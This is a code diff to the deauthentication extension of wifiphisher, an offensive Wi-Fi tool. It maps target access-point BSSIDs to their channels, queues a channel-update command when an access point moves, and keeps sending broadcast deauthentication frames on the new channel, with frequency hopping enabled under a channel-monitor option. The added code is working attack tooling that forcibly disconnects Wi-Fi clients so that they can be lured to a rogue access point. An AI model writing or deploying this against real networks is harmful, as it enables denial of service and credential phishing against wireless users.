@@ -7,6 +7,7 @@ Extension that sends 3 DEAUTH/DISAS Frames:
 
 import scapy.layers.dot11 as dot11
 import wifiphisher.common.constants as constants
+import wifiphisher.common.extensioncmds as extensioncmds
 
 
 class Deauth(object):
@@ -29,8 +30,8 @@ class Deauth(object):
         self._observed_clients = set()
         self._should_continue = True
         self._data = data
-        # the bssids having the same ESSID
-        self._deauth_bssids = set()
+        # Mapping target bssids to the channel
+        self._deauth_bssids = dict()
 
     @staticmethod
     def _craft_packet(sender, receiver, bssid):
@@ -111,6 +112,32 @@ class Deauth(object):
                      self._data.target_ap_bssid == packet.addr3) or
                     False)
 
+    def _send_channel_update_command(self, bssid, channel, pkts_to_send):
+        """
+        Send the channel update command if the channel has been changed
+        :param self: A Deauth object
+        :param bssid: target BSSID
+        :param channel: current channel
+        :param pkts_to_send: deauth frames
+        :type self: Deauth
+        :type bssid: str
+        :type channel: str
+        :type pkts_to_send: list
+        :return: None
+        :rtype: None
+        """
+        old_channel = self._deauth_bssids[bssid]
+        if old_channel != channel:
+            cmd = extensioncmds.BssidChannelUpdateCommand(bssid,
+                                                          old_channel,
+                                                          channel)
+            extensioncmds.EXTENSION_CMD_QUEUE.put(cmd)
+            # update to new channel
+            self._deauth_bssids[bssid] = channel
+            pkts_to_send += self._craft_packet(bssid,
+                                               constants.WIFI_BROADCAST,
+                                               bssid)
+
     def get_packet(self, packet):
         """
         Process the Dot11 packets and add any desired clients to
@@ -161,10 +188,13 @@ class Deauth(object):
             packets_to_send += self._craft_packet(bssid,
                                                   constants.WIFI_BROADCAST,
                                                   bssid)
-            self._deauth_bssids.add(bssid)
+            self._deauth_bssids[bssid] = str(channel)
 
         if bssid not in self._deauth_bssids:
             return ([], [])
+
+        self._send_channel_update_command(bssid, str(channel),
+                                          packets_to_send)
 
         clients = self._add_clients(sender, receiver, bssid)
         if clients:
@@ -230,6 +260,7 @@ class Deauth(object):
         if not self._data.is_freq_hop_allowed:
             return [self._data.target_ap_channel]
 
-        if self._data.target_ap_bssid and not self._data.args.deauth_essid:
+        if (self._data.target_ap_bssid and not self._data.args.deauth_essid
+                and not self._data.args.channel_monitor):
             return [self._data.target_ap_channel]
         return map(str, constants.ALL_2G_CHANNELS)
